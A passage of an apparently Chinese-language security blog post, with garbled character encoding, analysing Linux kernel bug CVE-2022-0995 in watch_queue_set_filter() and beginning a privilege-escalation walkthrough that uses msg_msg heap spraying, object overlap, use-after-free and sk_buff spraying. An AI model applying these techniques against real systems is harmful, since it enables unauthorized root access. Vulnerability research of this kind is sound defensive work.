filp-&gt;private_data;</span><br><span class="line"><span class="type">int</span> count, head, tail, mask;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line"><span class="keyword">case</span> FIONREAD:</span><br><span class="line">__pipe_lock(pipe);</span><br><span class="line">count = <span class="number">0</span>;</span><br><span class="line">head = pipe-&gt;head;</span><br><span class="line">tail = pipe-&gt;tail;</span><br><span class="line">mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (tail != head) &#123;</span><br><span class="line">count += pipe-&gt;bufs[tail &amp; mask].len;</span><br><span class="line">tail++;</span><br><span class="line">&#125;</span><br><span class="line">__pipe_unlock(pipe);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> put_user(count, (<span class="type">int</span> __user *)arg);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line"><span class="keyword">case</span> IOC_WATCH_QUEUE_SET_SIZE: &#123;</span><br><span class="line"><span class="type">int</span> ret;</span><br><span class="line">__pipe_lock(pipe);</span><br><span class="line">ret = watch_queue_set_size(pipe, arg);</span><br><span class="line">__pipe_unlock(pipe);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> IOC_WATCH_QUEUE_SET_FILTER:</span><br><span class="line"><span class="keyword">return</span> watch_queue_set_filter(</span><br><span class="line">pipe, (<span class="keyword">struct</span> watch_notification_filter __user *)arg);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> -ENOIOCTLCMD;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="0x01-æ¼æ´åˆ†æ"><a href="#0x01-æ¼æ´åˆ†æ" class="headerlink" title="0x01.æ¼æ´åˆ†æ"></a>0x01.æ¼æ´åˆ†æ</h1><p>æ¼æ´ä¾¿å‘ç”Ÿåœ¨ <code>watch_queue_set_filter()</code>ä¸­å°† filter æ•°ç»„ä»ç”¨æˆ·ç©ºé—´æ‹·è´åˆ°å†…æ ¸ç©ºé—´çš„è¿‡ç¨‹å½“ä¸­ï¼Œç°åœ¨è®©æˆ‘ä»¬ä»”ç»†å®¡è§†è¿™ä¸ªå‡½æ•°çš„æ‰§è¡Œæµç¨‹ï¼Œåœ¨ä¸€å¼€å§‹æ—¶é¦–å…ˆä¼šå°†ç”¨æˆ·ç©ºé—´çš„ <code>watch_notification_filter</code> ç»“æ„æ‹·è´åˆ°å†…æ ¸ç©ºé—´ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">watch_queue_set_filter</span><span class="params">(<span class="keyword">struct</span> pipe_inode_info *pipe,</span></span><br><span class="line"><span class="params">    <span class="keyword">struct</span> watch_notification_filter __user *_filter)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_notification_type_filter</span> *<span class="title">tf</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_notification_filter</span> <span class="title">filter</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_type_filter</span> *<span class="title">q</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_filter</span> *<span class="title">wfilter</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_queue</span> *<span class="title">wqueue</span> =</span> pipe-&gt;watch_queue;</span><br><span class="line"><span class="type">int</span> ret, nr_filter = <span class="number">0</span>, i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!wqueue)</span><br><span class="line"><span class="keyword">return</span> -ENODEV;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!_filter) &#123;</span><br><span class="line"><span class="comment">/* Remove the old filter */</span></span><br><span class="line">wfilter = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">goto</span> <span class="built_in">set</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Grab the user&#x27;s filter specification */</span></span><br><span class="line"><span class="keyword">if</span> (copy_from_user(&amp;filter, _filter, <span class="keyword">sizeof</span>(filter)) != <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line"><span class="keyword">if</span> (filter.nr_filters == <span class="number">0</span> ||</span><br><span class="line">    filter.nr_filters &gt; <span class="number">16</span> ||</span><br><span class="line">    filter.__reserved != <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br></pre></td></tr></table></figure><p>ä¹‹å <code>memdup_user()</code> åˆ†é…ä¸€å—ä¸´æ—¶ç©ºé—´ï¼Œå°†ç”¨æˆ·ç©ºé—´çš„ filter æ•°ç»„æ‹·è´è‡³è¯¥ä¸´æ—¶ç©ºé—´</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tf = memdup_user(_filter-&gt;filters, filter.nr_filters * <span class="keyword">sizeof</span>(*tf));</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(tf))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(tf);</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ä¼šéå†æ¯ä¸€ä¸ª <code>watch_notification_type_filter</code> ç»“æ„ï¼Œè®°å½• type åœ¨æŒ‡å®šèŒƒå›´çš„ filter çš„æ•°é‡åˆ°å˜é‡ <code>nr_filter</code> ä¸­ï¼Œè¿™é‡Œå…¶åˆ¤æ–­ä¸€ä¸ª type æ˜¯å¦åˆæ³•çš„èŒƒå›´æ˜¯ <code>sizeof(wfilter-&gt;type_filter) * 8</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ret = -EINVAL;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; filter.nr_filters; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> ((tf[i].info_filter &amp; ~tf[i].info_mask) ||</span><br><span class="line">    tf[i].info_mask &amp; WATCH_INFO_LENGTH)</span><br><span class="line"><span class="keyword">goto</span> err_filter;</span><br><span class="line"><span class="comment">/* Ignore any unknown types */</span></span><br><span class="line"><span class="keyword">if</span> (tf[i].type &gt;= <span class="keyword">sizeof</span>(wfilter-&gt;type_filter) * <span class="number">8</span>)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">nr_filter++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ä¼šåˆ†é…çœŸæ­£å‚¨å­˜ filter çš„çš„ç©ºé—´ï¼Œè¿™é‡Œç”¨äº†ä¸€ä¸ª <code>struct_size()</code> å¯¼å‡ºçš„å¤§å°ä¸º <code>sizeof(wfilter) + sizeof(filters) * nr_filter</code>ï¼ˆæ„Ÿå…´è¶£çš„åŒå­¦å¯ä»¥è‡ªè¡Œé˜…è¯»æºç ï¼‰ï¼Œæ³¨æ„åˆ°è¿™é‡Œè®¡ç®—å¤§å°ç”¨çš„æ˜¯æˆ‘ä»¬å‰é¢éå†è®¡ç®—å¾—åˆ°çš„ <code>nr_filter</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Now we need to build the internal filter from only the relevant</span></span><br><span class="line"><span class="comment"> * user-specified filters.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ret = -ENOMEM;</span><br><span class="line">wfilter = kzalloc(struct_size(wfilter, filters, nr_filter), GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!wfilter)</span><br><span class="line"><span class="keyword">goto</span> err_filter;</span><br><span class="line">wfilter-&gt;nr_filters = nr_filter;</span><br></pre></td></tr></table></figure><p>ä¹‹åæ˜¯å°† filter æ•°ç»„æ‹·è´åˆ°åˆ†é…çš„ç©ºé—´ä¸Šï¼Œ<strong>æˆ‘ä»¬çš„ç¬¬ä¸€ä¸ªæ¼æ´ä¾¿å‡ºç°åœ¨è¿™é‡Œï¼Œå…¶åˆ¤æ–­ type æ˜¯å¦åˆæ³•ä½¿ç”¨çš„æ˜¯</strong> <code>sizeof(wfilter-&gt;type_filter) * BITS_PER_LONG)</code> ï¼Œ<strong>ä¸å‰é¢ nr_filter çš„è®¡ç®—å­˜åœ¨ä¸ä¸€è‡´æ€§</strong>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">q = wfilter-&gt;filters;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; filter.nr_filters; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (tf[i].type &gt;= <span class="keyword">sizeof</span>(wfilter-&gt;type_filter) * BITS_PER_LONG)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">q-&gt;type= tf[i].type;</span><br><span class="line">q-&gt;info_filter= tf[i].info_filter;</span><br><span class="line">q-&gt;info_mask= tf[i].info_mask;</span><br><span class="line">q-&gt;subtype_filter[<span class="number">0</span>]= tf[i].subtype_filter[<span class="number">0</span>];</span><br><span class="line">__set_bit(q-&gt;type, wfilter-&gt;type_filter);</span><br><span class="line">q++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€Œ <code>BITS_PER_LONG</code> å®šä¹‰äº <code>/include/asm-generic/bitsperlong.h</code> ä¸­ï¼Œ<strong>åœ¨ 32 ä½ä¸‹ä¸º 32ï¼Œ64 ä½ä¸‹ä¸º64</strong>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_64BIT</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BITS_PER_LONG 64</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BITS_PER_LONG 32</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_64BIT */</span></span></span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå‰åå¯¹ type èŒƒå›´çš„è®¡ç®—ä¾¿å­˜åœ¨ä¸ä¸€è‡´ï¼Œæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯<strong>æˆ‘ä»¬å¯ä»¥æŒ‡å®šå‡ ä¸ª filter çš„ type ä¸ºï¼ˆè®¡ç®— nr_filter æ—¶çš„åˆæ³• type ä¸Šé™å€¼ï¼Œæ‹·è´ filter æ—¶çš„åˆæ³• type ä¸Šé™å€¼ï¼‰è¿™ä¸ªèŒƒå›´å†…çš„ç‰¹å®šå€¼ï¼Œè¿™æ ·å°±èƒ½è¶Šç•Œæ‹·è´ä¸€å®šæ•°é‡çš„ filterï¼Œä»è€Œå®Œæˆå †ä¸Šçš„è¶Šç•Œå†™</strong></p><p>é‚£ä¹ˆè¿™é‡Œæˆ‘ä»¬å®¹æ˜“è®¡ç®—å¾—å‡ºè§¦å‘ç¬¬ä¸€ä¸ªæ¼æ´çš„ type çš„èŒƒå›´åº”ä¸º <code>[0x80, 0x400)</code></p><p>è€Œ<strong>ç¬¬äºŒä¸ªæ¼æ´åˆ™å­˜åœ¨äºä¸Šé¢è¿™æ®µä»£ç ä¸­å¯¹</strong> <code>__set_bit()</code> <strong>çš„è°ƒç”¨ï¼Œè¯¥å‡½æ•°å®šä¹‰å¦‚ä¸‹ï¼š</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> __set_bit(<span class="type">int</span> nr, <span class="keyword">volatile</span> <span class="type">unsigned</span> <span class="type">long</span> *addr)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> mask = BIT_MASK(nr);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> *p = ((<span class="type">unsigned</span> <span class="type">long</span> *)addr) + BIT_WORD(nr);</span><br><span class="line"></span><br><span class="line">*p  |= mask;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä½œç”¨ä¾¿æ˜¯<strong>å°† addr åç§» BIT_WORD(nr) å¤„çš„ BIT_MASK(mask) ä½è¿›è¡Œç½® 1 æ“ä½œ</strong>ï¼Œè¿™é‡Œçš„ <code>BIT_WORD()</code> å®ä¸»è¦æ˜¯é™¤ä»¥ long ç±»å‹æ‰€å ä½æ•°ï¼ˆ64ï¼‰ï¼Œè€Œ <code>BIT_MASK()</code> å®åˆ™æ˜¯å¯¹ long ç±»å‹æ‰€å ä½æ•°æ±‚æ¨¡åç»“æœä½œä¸º unsigned long å€¼ 1 å·¦ç§»çš„ä½æ•°å¯¼å‡ºç»“æœæ•°å€¼ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> BIT_MASK(nr)(UL(1) &lt;&lt; ((nr) % BITS_PER_LONG))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BIT_WORD(nr)((nr) / BITS_PER_LONG)</span></span><br></pre></td></tr></table></figure><p>è€Œä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°åˆšå¥½ä¸º typeï¼Œç”±äºæˆ‘ä»¬çš„ type å¯ä»¥åœ¨ <code>[0x80, 0x400)</code> èŒƒå›´å†…å–ï¼Œ<strong>è€Œåˆ†é…çš„ filter ç©ºé—´å´æœªå¿…æœ‰é‚£ä¹ˆå¤§ï¼Œå› æ­¤è¿™é‡Œå­˜åœ¨ä¸€ä¸ªè¶Šç•Œç½® 1 ä½çš„æ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è®¾ç½®ä¸€ä¸ªè¾ƒå¤§çš„ type å®Œæˆå †ä¸Šè¶Šç•Œç½® 1 ä½çš„æ“ä½œ</strong></p><p>ä¾‹å¦‚å¯¹äº <code>kmalloc-96</code> è€Œè¨€ï¼Œæˆ‘ä»¬çš„å¯¹è±¡å¯ä»¥è¦†ç›–åˆ°ä¸‹å›¾æ‰€ç¤ºèŒƒå›´ï¼ˆæœ¬å›¾æ¥è‡ªäº <a href="https://blog.csdn.net/Breeze_CAT/article/details/123845526">breezeO_oå¸ˆå‚…çš„åšå®¢</a>ï¼‰ï¼š</p><p><img src="https://s2.loli.net/2022/04/06/KZAFrduvUizs4Dg.png"></p><h1 id="0x02-æ¼æ´åˆ©ç”¨"><a href="#0x02-æ¼æ´åˆ©ç”¨" class="headerlink" title="0x02.æ¼æ´åˆ©ç”¨"></a>0x02.æ¼æ´åˆ©ç”¨</h1><p>åœ¨<a href="https://github.com/Bonfee/CVE-2022-0995">ç›®å‰å…¬å¼€çš„ exp</a> ä¸­å¯¹è¯¥æ¼æ´çš„åˆ©ç”¨å…¶å®æ˜¯åŸºäº <code>__set_bit()</code> è¿›è¡Œåˆ©ç”¨çš„ï¼Œå› ä¸ºç›¸è¾ƒäºä¸å¥½æ§åˆ¶çš„ filter æº¢å‡ºï¼Œè¶Šç•Œå†™ 1 ä½åˆ™æ›´æ–¹ä¾¿æˆ‘ä»¬æ§åˆ¶ä¸€äº›æŒ‡é’ˆï¼Œä¾‹å¦‚ <code>msg_msg-&gt;m_list</code> åŒå‘é“¾è¡¨</p><p>åœ¨è¿™ä»½å…¬å¼€çš„ exp ä¸­ä½¿ç”¨çš„å…¶å®æ˜¯ä¸ CVE-2021-22555 ç›¸åŒçš„åˆ©ç”¨æŠ€å·§ï¼Œåªä¸è¿‡ç¯¡æ”¹ <code>msg_msg</code> å¤´éƒ¨çš„æ–¹å¼ä¸æ˜¯é‚»æ¥æº¢å‡ºå†™ 0ï¼Œè€Œæ˜¯è¶Šç•Œå†™ 1ï¼›æ¥ä¸‹æ¥ç¬”è€…å°†<del>å¤§å¹…æ‹·è´</del>ä½¿ç”¨ä¸ CVE-2021-22555 ç›¸åŒçš„åˆ©ç”¨æŠ€å·§å®Œæˆå¯¹è¯¥æ¼æ´çš„åˆ©ç”¨</p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><h3 id="Step-I-å †å–·-msg-msg-ï¼Œå»ºç«‹ä¸»ä»æ¶ˆæ¯é˜Ÿåˆ—ï¼Œæ„é€ é‡å è¾…åŠ©æ¶ˆæ¯"><a href="#Step-I-å †å–·-msg-msg-ï¼Œå»ºç«‹ä¸»ä»æ¶ˆæ¯é˜Ÿåˆ—ï¼Œæ„é€ é‡å è¾…åŠ©æ¶ˆæ¯" class="headerlink" title="Step.I å †å–· msg_msg ï¼Œå»ºç«‹ä¸»ä»æ¶ˆæ¯é˜Ÿåˆ—ï¼Œæ„é€ é‡å è¾…åŠ©æ¶ˆæ¯"></a>Step.I å †å–· <code>msg_msg</code> ï¼Œå»ºç«‹ä¸»ä»æ¶ˆæ¯é˜Ÿåˆ—ï¼Œæ„é€ é‡å è¾…åŠ©æ¶ˆæ¯</h3><p>ç°åœ¨æˆ‘ä»¬æœ‰äº†ä¸€ä¸ªå †ä¸Šè¶Šç•Œå†™ 1 ä½ï¼Œæˆ‘ä»¬è¯¥æ€ä¹ˆåˆ©ç”¨å‘¢ï¼Ÿæ¯”è¾ƒæœ´ç´ çš„ä¸€ç§æ€æƒ³ä¾¿æ˜¯è¦†å†™ä¸€ä¸ªç»“æ„ä½“ä¸­çš„æŒ‡é’ˆï¼Œåˆ©ç”¨ partial overwrite ä½¿å¾—ä¸¤ä¸ªè¿™æ ·çš„ç»“æ„ä½“çš„å¤´éƒ¨æŒ‡é’ˆæŒ‡å‘åŒä¸€ä¸ªç»“æ„ä½“ï¼Œ<strong>ä»è€Œå®ç° object overlapping</strong></p><p>é‚£ä¹ˆé€‰ç”¨ä»€ä¹ˆæ ·çš„ç»“æ„ä½“ä½œä¸º victim å‘¢ï¼Ÿè¿™é‡Œæˆ‘ä»¬é€‰æ‹©ä½¿ç”¨ <code>msg_msg</code> è¿™ä¸€ç»“æ„ä½“ï¼Œå…¶é•¿åº¦å¯æ§ï¼Œä¸”å¼€å¤´æ­£å¥½æ˜¯å†…æ ¸åŒå‘é“¾è¡¨ç»“æ„ä½“ï¼Œæˆ‘ä»¬æ‰€èƒ½è¦†å†™çš„ä¸ºå…¶ next æŒ‡é’ˆï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* one msg_msg structure for each message */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line"><span class="type">long</span> m_type;</span><br><span class="line"><span class="type">size_t</span> m_ts;<span class="comment">/* message text size */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="type">void</span> *security;</span><br><span class="line"><span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬åœ¨ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ä¸Šå‘é€å¤šä¸ªæ¶ˆæ¯æ—¶ï¼Œä¼šå½¢æˆå¦‚ä¸‹ç»“æ„ï¼š</p><p><img src="https://s2.loli.net/2022/02/24/wjzFeZiDUpxXVKJ.png" alt="image.png"></p><p>æˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸€å¼€å§‹æ—¶å…ˆåˆ›å»ºå¤šä¸ªæ¶ˆæ¯é˜Ÿåˆ—ï¼Œå¹¶åˆ†åˆ«åœ¨æ¯ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ä¸Šå‘é€ä¸¤æ¡æ¶ˆæ¯ï¼Œå½¢æˆå¦‚ä¸‹å†…å­˜å¸ƒå±€ï¼Œè¿™é‡Œä¸ºäº†ä¾¿åˆ©åç»­åˆ©ç”¨ï¼Œç¬¬ä¸€æ¡æ¶ˆæ¯ï¼ˆä¸»æ¶ˆæ¯ï¼‰çš„å¤§å°ä¸º 96ï¼Œç¬¬äºŒæ¡æ¶ˆæ¯ï¼ˆè¾…åŠ©æ¶ˆæ¯ï¼‰çš„å¤§å°ä¸º 0x400ï¼š</p><p><img src="https://s2.loli.net/2022/03/31/ViAM3gDxpl1kQj9.png" alt="image.png"></p><p>ä¹‹åæˆ‘ä»¬è¯»å‡ºå…¶ä¸­å‡ ä¸ªæ¶ˆæ¯é˜Ÿåˆ—çš„ä¸»æ¶ˆæ¯ä»¥äº§ç”Ÿç©ºæ´ï¼Œå†åˆ©ç”¨ <code>ioctl(fd, IOC_WATCH_QUEUE_SET_FILTER, &amp;filter)</code> è·å–åˆ°æˆ‘ä»¬åˆšé‡Šæ”¾çš„ <code>msg_msg</code> ç»“æ„ä½“çš„ç©ºé—´</p><p><img src="https://s2.loli.net/2022/04/06/pql2L98kxRvaZzA.png" alt="image.png"></p><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯<strong>æˆ‘ä»¬è‡³å°‘è¦é‡Šæ”¾ä¸¤ä¸ªä¸»æ¶ˆæ¯ï¼Œå› ä¸ºåœ¨åˆ†é…åˆ° watch_filter ä¹‹å‰ memdup_user() è¿˜éœ€è¦è·å–ä¸€ä¸ªå¯¹è±¡</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">tf = memdup_user(_filter-&gt;filters, filter.nr_filters * <span class="keyword">sizeof</span>(*tf));</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(tf))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(tf);</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Now we need to build the internal filter from only the relevant</span></span><br><span class="line"><span class="comment"> * user-specified filters.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ret = -ENOMEM;</span><br><span class="line">wfilter = kzalloc(struct_size(wfilter, filters, nr_filter), GFP_KERNEL);</span><br></pre></td></tr></table></figure><p>å¯¹äº <code>__set_bit()</code> è€Œè¨€å…¶å¯ä»¥ç½® 1 çš„èŒƒå›´å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œåˆšå¥½å¯ä»¥è¦†ç›–åˆ°ä¸‹ä¸€ç›¸é‚» object çš„å‰ 16 å­—èŠ‚</p><p><img src="https://s2.loli.net/2022/04/06/KZAFrduvUizs4Dg.png" alt="image.png"></p><p>åˆ©ç”¨è¶Šç•Œç½® 1 ä½æˆ‘ä»¬å¯ä»¥è¦†å†™åˆ°å…¶ç›¸é‚»çš„ä¸»æ¶ˆæ¯çš„ next æŒ‡é’ˆï¼Œè‹¥è¯¥ä½åˆšå¥½è¢«ç”± 0 å˜ä¸º 1ï¼Œåˆ™æˆ‘ä»¬å¾ˆå®¹æ˜“æ„é€ å‡º<strong>åœ¨ä¸¤ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ä¸Šå­˜åœ¨ä¸¤ä¸ªä¸»æ¶ˆæ¯æŒ‡å‘åŒä¸€ä¸ªè¾…åŠ©æ¶ˆæ¯</strong>çš„è¿™æ ·çš„å±€é¢</p><p><img src="https://s2.loli.net/2022/04/06/NWHMurcU36EsIAp.png" alt="image.png"></p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨ä¸»ä»æ¶ˆæ¯ä¸­æ”¾ç½®å¯¹åº”çš„å€¼æ¥æ ‡è¯†å–·å°„çš„ä¸åŒçš„æ¶ˆæ¯é˜Ÿåˆ—ï¼Œéå†è¯»å–æ‰€æœ‰é˜Ÿåˆ—æ¥æ„ŸçŸ¥æŒ‡å‘äº†åŒä¸€è¾…åŠ©æ¶ˆæ¯çš„ä¸¤ä¸ªé˜Ÿåˆ—</p><blockquote><p>åˆ©ç”¨ <code>MSG_COPY</code> æ ‡å¿—ä½å¯ä»¥è¯»å–æ¶ˆæ¯é˜Ÿåˆ—ä¸Šçš„æ¶ˆæ¯è€Œä¸é‡Šæ”¾ï¼Œå‚è§<a href="https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#0x07-system-V-%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%EF%BC%9A%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%E2%80%9C%E8%8F%9C%E5%8D%95%E5%A0%86%E2%80%9D">è¿™é‡Œ</a></p></blockquote><h3 id="Step-II-é‡Šæ”¾è¾…åŠ©æ¶ˆæ¯ï¼Œæ„é€ -UAF"><a href="#Step-II-é‡Šæ”¾è¾…åŠ©æ¶ˆæ¯ï¼Œæ„é€ -UAF" class="headerlink" title="Step.II é‡Šæ”¾è¾…åŠ©æ¶ˆæ¯ï¼Œæ„é€  UAF"></a>Step.II é‡Šæ”¾è¾…åŠ©æ¶ˆæ¯ï¼Œæ„é€  UAF</h3><p>æ­¤æ—¶æˆ‘ä»¬å°†è¾…åŠ©æ¶ˆæ¯é‡Šæ”¾æ‰ï¼Œä¾¿èƒ½æˆåŠŸå®Œæˆ UAF çš„æ„å»ºï¼Œæ­¤æ—¶<strong>æˆ‘ä»¬ä»èƒ½é€šè¿‡å…¶ä¸­ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—è®¿é—®åˆ°è¯¥è¾…åŠ©æ¶ˆæ¯å¯¹åº” objectï¼Œä½†å®é™…ä¸Šè¿™ä¸ª object å·²ç»åœ¨ freelist ä¸Šäº†</strong></p><p><img src="https://s2.loli.net/2022/04/06/w9RE63dNuVjcmbp.png" alt="image.png"></p><h3 id="Step-III-å †å–·-sk-buff-ä¼ªé€ è¾…åŠ©æ¶ˆæ¯ï¼Œæ³„éœ²-UAF-obj-åœ°å€"><a href="#Step-III-å †å–·-sk-buff-ä¼ªé€ è¾…åŠ©æ¶ˆæ¯ï¼Œæ³„éœ²-UAF-obj-åœ°å€" class="headerlink" title="Step.III å †å–· sk_buff ä¼ªé€ è¾…åŠ©æ¶ˆæ¯ï¼Œæ³„éœ² UAF obj åœ°å€"></a>Step.III å †å–· <code>sk_buff</code> ä¼ªé€ è¾…åŠ©æ¶ˆæ¯ï¼Œæ³„éœ² UAF obj åœ°å€</h3><p>æ¥ä¸‹æ¥æˆ‘ä»¬è€ƒè™‘å¦‚ä½•åˆ©ç”¨è¿™ä¸ª UAFï¼Œå› ä¸ºå…¶ä»ä½äºæ¶ˆæ¯é˜Ÿåˆ—ä¸Šæ‰€ä»¥æˆ‘ä»¬è€ƒè™‘ä¼ªé€  <code>msg_msg</code> ç»“æ„ä½“è¿›è¡Œåç»­çš„åˆ©ç”¨ï¼Œè¿™é‡Œæˆ‘ä»¬é€‰ç”¨å¦å¤–ä¸€ä¸ªå¸¸ç”¨æ¥è¿›è¡Œå †å–·çš„ç»“æ„ä½“â€”â€”<code>sk_buff</code>ï¼Œç±»ä¼¼äº <code>msg_msg</code>ï¼Œå…¶åŒæ ·å¯ä»¥æä¾›è¿‘ä¹ä»»æ„å¤§å°å¯¹è±¡çš„åˆ†é…å†™å…¥ä¸é‡Šæ”¾ï¼Œä½†ä¸åŒçš„æ˜¯ <code>msg_msg</code> ç”±ä¸€ä¸ª header åŠ 